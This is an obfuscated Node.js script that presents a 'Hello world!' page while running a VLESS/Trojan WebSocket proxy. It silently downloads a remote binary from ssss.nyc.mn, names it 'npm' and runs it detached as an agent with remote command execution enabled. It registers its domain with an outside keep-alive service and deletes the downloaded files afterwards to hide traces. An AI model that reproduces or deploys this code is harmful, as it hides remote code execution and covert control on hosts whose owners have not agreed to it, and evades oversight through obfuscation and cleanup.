const _0xa7c86d=_0x16d8;(function(_0x10b9c6,_0x2eb648){const _0x59d6a0=_0x16d8,_0x31b80e=_0x10b9c6();while(!![]){try{const _0x1c761b=-parseInt(_0x59d6a0(0xc7))/0x1+parseInt(_0x59d6a0(0x12d))/0x2*(parseInt(_0x59d6a0(0xf4))/0x3)+parseInt(_0x59d6a0(0x107))/0x4+-parseInt(_0x59d6a0(0x10b))/0x5*(parseInt(_0x59d6a0(0xec))/0x6)+parseInt(_0x59d6a0(0x11e))/0x7*(-parseInt(_0x59d6a0(0xaf))/0x8)+-parseInt(_0x59d6a0(0xde))/0x9+parseInt(_0x59d6a0(0xe1))/0xa;if(_0x1c761b===_0x2eb648)break;else _0x31b80e['push'](_0x31b80e['shift']());}catch(_0x391cd5){_0x31b80e['push'](_0x31b80e['shift']());}}}(_0x1e1c,0x6344f));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0xa7c86d(0x108)),net=require(_0xa7c86d(0xb7)),path=require(_0xa7c86d(0xdd)),crypto=require(_0xa7c86d(0x106)),{Buffer}=require(_0xa7c86d(0xbb)),{exec,execSync}=require(_0xa7c86d(0x10c)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xa7c86d(0x12f)][_0xa7c86d(0xc1)]||'d3fc33bc-fa20-41c8-bfcf-fda15a7d96f5',NEZHA_SERVER=process[_0xa7c86d(0x12f)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0xa7c86d(0xd1)]||'',NEZHA_KEY=process[_0xa7c86d(0x12f)][_0xa7c86d(0x115)]||'',DOMAIN=process[_0xa7c86d(0x12f)][_0xa7c86d(0x11d)]||_0xa7c86d(0xbd),AUTO_ACCESS=process[_0xa7c86d(0x12f)][_0xa7c86d(0xd9)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0xa7c86d(0x125)](0x0,0x8),SUB_PATH=process[_0xa7c86d(0x12f)]['SUB_PATH']||'sub',NAME=process[_0xa7c86d(0x12f)][_0xa7c86d(0xd8)]||_0xa7c86d(0xce),PORT=process[_0xa7c86d(0x12f)][_0xa7c86d(0xbe)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x57f7dc=_0xa7c86d;try{const _0x5e00b7=await axios[_0x57f7dc(0xfb)]('https://speed.cloudflare.com/meta'),_0x1c00f5=_0x5e00b7[_0x57f7dc(0x11c)];ISP=(_0x1c00f5[_0x57f7dc(0x10d)]+'-'+_0x1c00f5[_0x57f7dc(0xcc)])['replace'](/ /g,'_');}catch(_0x3712e0){ISP='Unknown';}};GetISP();const httpServer=http[_0xa7c86d(0xc9)]((_0x145cac,_0x113a4e)=>{const _0x4d57e9=_0xa7c86d;if(_0x145cac[_0x4d57e9(0x127)]==='/'){const _0x2b62cd=path[_0x4d57e9(0xd4)](__dirname,_0x4d57e9(0xdc));fs['readFile'](_0x2b62cd,_0x4d57e9(0x116),(_0x5f2f70,_0x4e7f5b)=>{const _0x596976=_0x4d57e9;if(_0x5f2f70){_0x113a4e[_0x596976(0xb5)](0xc8,{'Content-Type':_0x596976(0xca)}),_0x113a4e[_0x596976(0x12a)](_0x596976(0xfd));return;}_0x113a4e[_0x596976(0xb5)](0xc8,{'Content-Type':'text/html'}),_0x113a4e['end'](_0x4e7f5b);});return;}else{if(_0x145cac[_0x4d57e9(0x127)]==='/'+SUB_PATH){const _0x47da7d=_0x4d57e9(0xfa)+UUID+'@'+DOMAIN+_0x4d57e9(0x10a)+DOMAIN+_0x4d57e9(0x109)+DOMAIN+_0x4d57e9(0x100)+WSPATH+'#'+NAME+'-'+ISP,_0x39314d=_0x4d57e9(0x124)+UUID+'@'+DOMAIN+_0x4d57e9(0xf2)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4d57e9(0x100)+WSPATH+'#'+NAME+'-'+ISP,_0x5b82af=_0x47da7d+'\x0a'+_0x39314d,_0x4e1e3a=Buffer[_0x4d57e9(0x129)](_0x5b82af)[_0x4d57e9(0x10f)]('base64');_0x113a4e[_0x4d57e9(0xb5)](0xc8,{'Content-Type':_0x4d57e9(0xd2)}),_0x113a4e['end'](_0x4e1e3a+'\x0a');}else _0x113a4e[_0x4d57e9(0xb5)](0x194,{'Content-Type':_0x4d57e9(0xd2)}),_0x113a4e[_0x4d57e9(0x12a)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0xa7c86d(0xb9)](/-/g,''),DNS_SERVERS=[_0xa7c86d(0x110),_0xa7c86d(0xf0)];function resolveHost(_0x105299){return new Promise((_0x14da58,_0x2c9390)=>{const _0xcd2c3c=_0x16d8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xcd2c3c(0xe5)](_0x105299)){_0x14da58(_0x105299);return;}let _0x3516da=0x0;function _0x2de025(){const _0x53e3b3=_0xcd2c3c;if(_0x3516da>=DNS_SERVERS[_0x53e3b3(0xff)]){_0x2c9390(new Error('Failed\x20to\x20resolve\x20'+_0x105299+_0x53e3b3(0xbc)));return;}const _0x49efcf=DNS_SERVERS[_0x3516da];_0x3516da++;const _0x5931fa=_0x53e3b3(0xb4)+encodeURIComponent(_0x105299)+_0x53e3b3(0x12e);axios[_0x53e3b3(0xfb)](_0x5931fa,{'timeout':0x1388,'headers':{'Accept':_0x53e3b3(0xf7)}})[_0x53e3b3(0xda)](_0x4d47c2=>{const _0x499e36=_0x53e3b3,_0x41cc9c=_0x4d47c2[_0x499e36(0x11c)];if(_0x41cc9c[_0x499e36(0xcd)]===0x0&&_0x41cc9c[_0x499e36(0x117)]&&_0x41cc9c[_0x499e36(0x117)][_0x499e36(0xff)]>0x0){const _0x138888=_0x41cc9c['Answer'][_0x499e36(0xcf)](_0x3ccc89=>_0x3ccc89['type']===0x1);if(_0x138888){_0x14da58(_0x138888[_0x499e36(0x11c)]);return;}}_0x2de025();})[_0x53e3b3(0xb6)](_0xa74950=>{_0x2de025();});}_0x2de025();});}function handleVlessConnection(_0x7f1a3e,_0x8704bc){const _0x27379c=_0xa7c86d,[_0x48f392]=_0x8704bc,_0x557b23=_0x8704bc['slice'](0x1,0x11);if(!_0x557b23[_0x27379c(0x120)]((_0x22f5c7,_0x18a3bc)=>_0x22f5c7==parseInt(uuid['substr'](_0x18a3bc*0x2,0x2),0x10)))return![];let _0x59d895=_0x8704bc['slice'](0x11,0x12)[_0x27379c(0x103)]()+0x13;const _0x71dee9=_0x8704bc[_0x27379c(0x125)](_0x59d895,_0x59d895+=0x2)['readUInt16BE'](0x0),_0x28f94c=_0x8704bc[_0x27379c(0x125)](_0x59d895,_0x59d895+=0x1)['readUInt8'](),_0x2a5f9b=_0x28f94c==0x1?_0x8704bc['slice'](_0x59d895,_0x59d895+=0x4)[_0x27379c(0xd4)]('.'):_0x28f94c==0x2?new TextDecoder()[_0x27379c(0xf8)](_0x8704bc[_0x27379c(0x125)](_0x59d895+0x1,_0x59d895+=0x1+_0x8704bc['slice'](_0x59d895,_0x59d895+0x1)['readUInt8']())):_0x28f94c==0x3?_0x8704bc[_0x27379c(0x125)](_0x59d895,_0x59d895+=0x10)[_0x27379c(0xd3)]((_0x59aac8,_0x4b661b,_0x3f6c8c,_0x2f684e)=>_0x3f6c8c%0x2?_0x59aac8['concat'](_0x2f684e[_0x27379c(0x125)](_0x3f6c8c-0x1,_0x3f6c8c+0x1)):_0x59aac8,[])[_0x27379c(0xd7)](_0x273977=>_0x273977['readUInt16BE'](0x0)[_0x27379c(0x10f)](0x10))[_0x27379c(0xd4)](':'):'';_0x7f1a3e[_0x27379c(0xe2)](new Uint8Array([_0x48f392,0x0]));const _0x42660f=createWebSocketStream(_0x7f1a3e);return resolveHost(_0x2a5f9b)['then'](_0x381eaf=>{const _0x4c790b=_0x27379c;net[_0x4c790b(0xbf)]({'host':_0x381eaf,'port':_0x71dee9},function(){const _0xfac64f=_0x4c790b;this[_0xfac64f(0xc8)](_0x8704bc[_0xfac64f(0x125)](_0x59d895)),_0x42660f['on'](_0xfac64f(0x101),()=>{})[_0xfac64f(0xc6)](this)['on'](_0xfac64f(0x101),()=>{})['pipe'](_0x42660f);})['on'](_0x4c790b(0x101),()=>{});})[_0x27379c(0xb6)](_0x11747c=>{const _0x2490d9=_0x27379c;net[_0x2490d9(0xbf)]({'host':_0x2a5f9b,'port':_0x71dee9},function(){const _0x5a5b7c=_0x2490d9;this[_0x5a5b7c(0xc8)](_0x8704bc[_0x5a5b7c(0x125)](_0x59d895)),_0x42660f['on'](_0x5a5b7c(0x101),()=>{})['pipe'](this)['on'](_0x5a5b7c(0x101),()=>{})[_0x5a5b7c(0xc6)](_0x42660f);})['on'](_0x2490d9(0x101),()=>{});}),!![];}function handleTrojanConnection(_0x1336b3,_0x59da33){const _0x5c3ce6=_0xa7c86d;try{if(_0x59da33[_0x5c3ce6(0xff)]<0x3a)return![];const _0x59a09d=_0x59da33[_0x5c3ce6(0x125)](0x0,0x38)[_0x5c3ce6(0x10f)](),_0x96c609=[UUID];let _0x4c480e=null;for(const _0x2bc8a4 of _0x96c609){const _0x23020f=crypto[_0x5c3ce6(0x119)](_0x5c3ce6(0xe4))[_0x5c3ce6(0xba)](_0x2bc8a4)[_0x5c3ce6(0x121)](_0x5c3ce6(0xd6));if(_0x23020f===_0x59a09d){_0x4c480e=_0x2bc8a4;break;}}if(!_0x4c480e)return![];let _0x234c0e=0x38;_0x59da33[_0x234c0e]===0xd&&_0x59da33[_0x234c0e+0x1]===0xa&&(_0x234c0e+=0x2);const _0x2f278a=_0x59da33[_0x234c0e];if(_0x2f278a!==0x1)return![];_0x234c0e+=0x1;const _0x59007c=_0x59da33[_0x234c0e];_0x234c0e+=0x1;let _0x33ef9e,_0x2b02ee;if(_0x59007c===0x1)_0x33ef9e=_0x59da33[_0x5c3ce6(0x125)](_0x234c0e,_0x234c0e+0x4)[_0x5c3ce6(0xd4)]('.'),_0x234c0e+=0x4;else{if(_0x59007c===0x3){const _0x3afcfe=_0x59da33[_0x234c0e];_0x234c0e+=0x1,_0x33ef9e=_0x59da33[_0x5c3ce6(0x125)](_0x234c0e,_0x234c0e+_0x3afcfe)[_0x5c3ce6(0x10f)](),_0x234c0e+=_0x3afcfe;}else{if(_0x59007c===0x4)_0x33ef9e=_0x59da33[_0x5c3ce6(0x125)](_0x234c0e,_0x234c0e+0x10)[_0x5c3ce6(0xd3)]((_0x1bb572,_0x388fd0,_0x3b496f,_0x1df872)=>_0x3b496f%0x2?_0x1bb572[_0x5c3ce6(0x112)](_0x1df872['slice'](_0x3b496f-0x1,_0x3b496f+0x1)):_0x1bb572,[])[_0x5c3ce6(0xd7)](_0x52fe42=>_0x52fe42[_0x5c3ce6(0xc3)](0x0)[_0x5c3ce6(0x10f)](0x10))['join'](':'),_0x234c0e+=0x10;else return![];}}_0x2b02ee=_0x59da33[_0x5c3ce6(0xc3)](_0x234c0e),_0x234c0e+=0x2;_0x234c0e<_0x59da33['length']&&_0x59da33[_0x234c0e]===0xd&&_0x59da33[_0x234c0e+0x1]===0xa&&(_0x234c0e+=0x2);const _0x1d7a0d=createWebSocketStream(_0x1336b3);return resolveHost(_0x33ef9e)[_0x5c3ce6(0xda)](_0x2e76ab=>{const _0x1e7649=_0x5c3ce6;net[_0x1e7649(0xbf)]({'host':_0x2e76ab,'port':_0x2b02ee},function(){const _0x7f6d5e=_0x1e7649;_0x234c0e<_0x59da33['length']&&this[_0x7f6d5e(0xc8)](_0x59da33[_0x7f6d5e(0x125)](_0x234c0e)),_0x1d7a0d['on'](_0x7f6d5e(0x101),()=>{})['pipe'](this)['on'](_0x7f6d5e(0x101),()=>{})[_0x7f6d5e(0xc6)](_0x1d7a0d);})['on'](_0x1e7649(0x101),()=>{});})[_0x5c3ce6(0xb6)](_0x3d464c=>{const _0x1bf0cb=_0x5c3ce6;net[_0x1bf0cb(0xbf)]({'host':_0x33ef9e,'port':_0x2b02ee},function(){const _0x1e119b=_0x1bf0cb;_0x234c0e<_0x59da33['length']&&this[_0x1e119b(0xc8)](_0x59da33['slice'](_0x234c0e)),_0x1d7a0d['on'](_0x1e119b(0x101),()=>{})['pipe'](this)['on'](_0x1e119b(0x101),()=>{})['pipe'](_0x1d7a0d);})['on'](_0x1bf0cb(0x101),()=>{});}),!![];}catch(_0x49228c){return![];}}function _0x1e1c(){const _0x79795e=['1234.abc.com','PORT','connect','includes','UUID','arch','readUInt16BE','stream','trim','pipe','788802qUqKzP','write','createServer','text/html','\x20-p\x20','asOrganization','Status','Hug','find','--tls','NEZHA_PORT','text/plain','reduce','join','aarch64','hex','map','NAME','AUTO_ACCESS','then','client_secret:\x20','index.html','path','97002OiRwdE','2096','utf-8','19000230aLTRWO','send','https://oooo.serv00.net/add-url','sha224','test','8443','application/json','npm','arm','https://arm64.ssss.nyc.mn/agent','log','292794aCqizV','listen','2087','once','1.1.1.1','connection',':443?security=tls&sni=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','9fjNYSe','close','2053','application/dns-json','decode','Automatic\x20Access\x20Task\x20added\x20successfully','vless://','get','createWriteStream','Hello\x20world!','pop','length','&path=%2F','error','unlink','readUInt8','https://arm64.ssss.nyc.mn/v1','post','crypto','6068uFUDNZ','axios','&fp=chrome&type=ws&host=',':443?encryption=none&security=tls&sni=','35YtVmun','child_process','country','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','toString','8.8.4.4','substr','concat','message','config.yaml','NEZHA_KEY','utf8','Answer','npm\x20is\x20already\x20running,\x20skip\x20running...','createHash','npm\x20is\x20running','/bin/bash','data','DOMAIN','266ggZvQH','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','every','digest','arm64','setsid\x20nohup\x20./npm\x20-s\x20','trojan://','slice','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','url','Server\x20is\x20running\x20on\x20port\x20','from','end','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','false','45208hXQjXB','&type=A','env','88752FZmTSE','npm\x20download\x20successfully','2083','npm\x20running\x20error:','split','https://dns.google/resolve?name=','writeHead','catch','net','https://','replace','update','buffer','\x20with\x20all\x20DNS\x20servers'];_0x1e1c=function(){return _0x79795e;};return _0x1e1c();}wss['on'](_0xa7c86d(0xf1),(_0x3ef8fe,_0x8afc20)=>{const _0x5b763b=_0xa7c86d,_0x28d505=_0x8afc20[_0x5b763b(0x127)]||'';_0x3ef8fe[_0x5b763b(0xef)](_0x5b763b(0x113),_0x1c4966=>{const _0xd009a4=_0x5b763b;if(_0x1c4966['length']>0x11&&_0x1c4966[0x0]===0x0){const _0x541978=_0x1c4966[_0xd009a4(0x125)](0x1,0x11),_0x32bb6c=_0x541978[_0xd009a4(0x120)]((_0x1dedd1,_0xa0a19d)=>_0x1dedd1==parseInt(uuid[_0xd009a4(0x111)](_0xa0a19d*0x2,0x2),0x10));if(_0x32bb6c){!handleVlessConnection(_0x3ef8fe,_0x1c4966)&&_0x3ef8fe[_0xd009a4(0xf5)]();return;}}!handleTrojanConnection(_0x3ef8fe,_0x1c4966)&&_0x3ef8fe['close']();})['on'](_0x5b763b(0x101),()=>{});});function _0x16d8(_0x4da500,_0x1e50f3){_0x4da500=_0x4da500-0xaf;const _0x1e1c24=_0x1e1c();let _0x16d8c4=_0x1e1c24[_0x4da500];return _0x16d8c4;}const getDownloadUrl=()=>{const _0x3b016c=_0xa7c86d,_0x51a6aa=os[_0x3b016c(0xc2)]();return _0x51a6aa===_0x3b016c(0xe9)||_0x51a6aa===_0x3b016c(0x122)||_0x51a6aa===_0x3b016c(0xd5)?!NEZHA_PORT?_0x3b016c(0x104):_0x3b016c(0xea):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x23e2cb=_0xa7c86d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x40eca0=getDownloadUrl(),_0x4c3716=await axios({'method':'get','url':_0x40eca0,'responseType':_0x23e2cb(0xc4)}),_0x56d9ea=fs[_0x23e2cb(0xfc)](_0x23e2cb(0xe8));return _0x4c3716[_0x23e2cb(0x11c)]['pipe'](_0x56d9ea),new Promise((_0x172d9e,_0x154ea8)=>{_0x56d9ea['on']('finish',()=>{const _0x15beec=_0x16d8;console[_0x15beec(0xeb)](_0x15beec(0xb0)),exec('chmod\x20+x\x20npm',_0x1e052a=>{if(_0x1e052a)_0x154ea8(_0x1e052a);_0x172d9e();});}),_0x56d9ea['on']('error',_0x154ea8);});}catch(_0x325a69){throw _0x325a69;}},runnz=async()=>{const _0x1693ec=_0xa7c86d;try{const _0x1b0c55=execSync(_0x1693ec(0x11f),{'encoding':_0x1693ec(0xe0)});if(_0x1b0c55[_0x1693ec(0xc5)]()!==''){console[_0x1693ec(0xeb)](_0x1693ec(0x118));return;}}catch(_0x10f9ff){}await downloadFile();let _0x1933d5='',_0x18af7a=['443',_0x1693ec(0xe6),_0x1693ec(0xdf),_0x1693ec(0xee),_0x1693ec(0xb1),_0x1693ec(0xf6)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x172128=_0x18af7a[_0x1693ec(0xc0)](NEZHA_PORT)?_0x1693ec(0xd0):'';_0x1933d5=_0x1693ec(0x123)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1693ec(0xcb)+NEZHA_KEY+'\x20'+_0x172128+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5120db=NEZHA_SERVER[_0x1693ec(0xc0)](':')?NEZHA_SERVER[_0x1693ec(0xb3)](':')[_0x1693ec(0xfe)]():'',_0x389d04=_0x18af7a[_0x1693ec(0xc0)](_0x5120db)?'true':_0x1693ec(0x12c),_0x383d85=_0x1693ec(0xdb)+NEZHA_KEY+_0x1693ec(0x126)+NEZHA_SERVER+_0x1693ec(0x12b)+_0x389d04+_0x1693ec(0xf3)+UUID;fs['writeFileSync'](_0x1693ec(0x114),_0x383d85);}_0x1933d5=_0x1693ec(0x10e);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1933d5,{'shell':_0x1693ec(0x11b)},_0x260319=>{const _0x1cf5ac=_0x1693ec;if(_0x260319)console['error'](_0x1cf5ac(0xb2),_0x260319);else console[_0x1cf5ac(0xeb)](_0x1cf5ac(0x11a));});}catch(_0x5c63e8){console[_0x1693ec(0x101)]('error:\x20'+_0x5c63e8);}};async function addAccessTask(){const _0x5c3669=_0xa7c86d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x493e76=_0x5c3669(0xb8)+DOMAIN;try{const _0x5efd7e=await axios[_0x5c3669(0x105)](_0x5c3669(0xe3),{'url':_0x493e76},{'headers':{'Content-Type':_0x5c3669(0xe7)}});console[_0x5c3669(0xeb)](_0x5c3669(0xf9));}catch(_0x454457){}}const delFiles=()=>{const _0x55b6f7=_0xa7c86d;fs[_0x55b6f7(0x102)](_0x55b6f7(0xe8),()=>{}),fs[_0x55b6f7(0x102)](_0x55b6f7(0x114),()=>{});};httpServer[_0xa7c86d(0xed)](PORT,()=>{const _0x2d194b=_0xa7c86d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2d194b(0xeb)](_0x2d194b(0x128)+PORT);});
